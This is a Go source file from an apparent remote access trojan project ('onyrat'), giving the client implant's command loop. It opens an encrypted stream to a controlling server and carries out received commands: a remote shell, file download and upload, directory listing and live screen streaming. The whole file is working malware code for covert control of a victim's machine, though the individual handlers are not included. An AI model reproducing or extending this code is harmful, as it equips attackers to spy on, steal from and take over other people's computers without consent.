//go:build client
// +build client

package commands

import (
	"context"
	"errors"
	"fmt"

	handlers "github.com/Onyz107/onyrat/internal/commands/client"
	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/network"
)

func (ch *CommandHandler) RunClient() {
	inCtx, cancel := context.WithCancelCause(ch.Ctx)
	ch.cancel = cancel
	defer func() {
		if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
			ch.done <- fmt.Errorf("failed to run client: %w", err)
		} else {
			ch.done <- nil
		}
	}()
	defer cancel(nil)

	client, ok := ch.Communicator.(*network.KCPClient)
	if !ok {
		cancel(fmt.Errorf("invalid client"))
		return
	}

	stream, err := client.Manager.OpenStream(commandStream, 0)
	if err != nil {
		cancel(fmt.Errorf("failed to open command stream: %w", err))
		return
	}
	defer stream.Close()

	buf := smallBufPool.Get().([]byte)
	defer smallBufPool.Put(buf)

	for {
		select {

		case <-inCtx.Done():
			return

		default:
			logger.Log.Debug("Waiting for command")

			n, err := client.ReceiveEncrypted(stream, buf, 0)
			if err != nil {
				cancel(fmt.Errorf("failed to receive command: %v", err))
				continue
			}

			cmd := string(buf[:n])
			logger.Log.Infof("received command: %s", cmd)

			switch cmd {

			case "shell":
				if err := handlers.HandleShell(client); err != nil {
					logger.Log.Error(err)
				}

			case "download":
				if err := handlers.HandleDownload(client, stream, inCtx); err != nil {
					logger.Log.Error(err)
				}

			case "upload":
				if err := handlers.HandleUpload(client, stream, inCtx); err != nil {
					logger.Log.Error(err)
				}

			case "ls":
				if err := handlers.HandleList(client, stream); err != nil {
					logger.Log.Error(err)
				}

			case "screenstream":
				go func() {
					if err := handlers.HandleScreenstream(client, inCtx); err != nil {
						logger.Log.Error(err)
					}
				}()

			default:
				logger.Log.Warnf("unknown command: %s", cmd)

			}

		}
	}
}

func (ch *CommandHandler) StartClient() {
	if ch.done == nil {
		ch.done = make(chan error, 1)
	}
	go ch.RunClient()
}

func (ch *CommandHandler) WaitClient() error {
	if ch.done != nil {
		return <-ch.done
	}
	return fmt.Errorf("client command handler not initialized")
}

func (ch *CommandHandler) StopClient() {
	if ch.cancel != nil {
		ch.cancel(fmt.Errorf("stopped by user"))
	}
	ch.cancel = nil
}
